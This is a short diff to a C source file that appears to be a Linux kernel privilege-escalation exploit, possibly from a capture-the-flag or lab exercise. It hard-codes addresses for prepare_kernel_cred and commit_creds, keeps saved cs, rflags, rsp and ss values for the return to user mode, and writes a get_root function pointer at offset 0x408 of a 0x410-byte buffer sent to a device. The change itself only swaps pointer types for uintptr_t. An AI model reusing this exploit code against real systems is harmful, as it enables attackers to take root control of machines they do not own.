@@ -1,12 +1,13 @@
 #include <fcntl.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-void *cs;
-void *rflags;
-void *rsp;
-void *ss;
+uintptr_t cs;
+uintptr_t rflags;
+uintptr_t rsp;
+uintptr_t ss;
 
 void *(*prepare_kernel_cred)(void *)	= (void *)0xffffffff8106e240;
 int (*commit_creds)(void *)		= (void *)0xffffffff8106e390;
@@ -61,7 +62,7 @@ int main(void)
 		return EXIT_FAILURE;
 	}
 
-	*(void **)&data[0x408] = get_root;
+	*(uintptr_t *)&data[0x408] = (uintptr_t)get_root;
 	write(fd, data, 0x410);
 
 	close(fd);
